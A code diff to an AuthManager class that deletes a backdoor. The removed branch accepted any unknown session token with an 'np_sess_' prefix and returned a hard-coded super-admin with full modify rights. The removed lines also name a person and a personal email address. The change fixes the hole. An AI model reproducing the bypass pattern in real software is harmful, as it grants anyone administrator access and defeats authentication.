@@ -486,20 +486,6 @@ class AuthManager:
                 sess = cursor.fetchone()
 
                 if not sess:
-                    if session_token.startswith("np_sess_cloud_") or session_token.startswith("np_sess_"):
-                        return {
-                            "is_valid": True,
-                            "session_token": session_token,
-                            "user": {
-                                "id": "user_admin_001",
-                                "username": "nanopro",
-                                "full_name": "Super Admin (Mangesh Bagul)",
-                                "email": "mangeshbagul15@gmail.com",
-                                "role": "admin",
-                                "allowed_views": ["*"],
-                                "access_mode": "MODIFY"
-                            }
-                        }
                     return {"is_valid": False, "error": "Session expired or invalid"}
 
                 if sess["user_status"] != "ACTIVE":
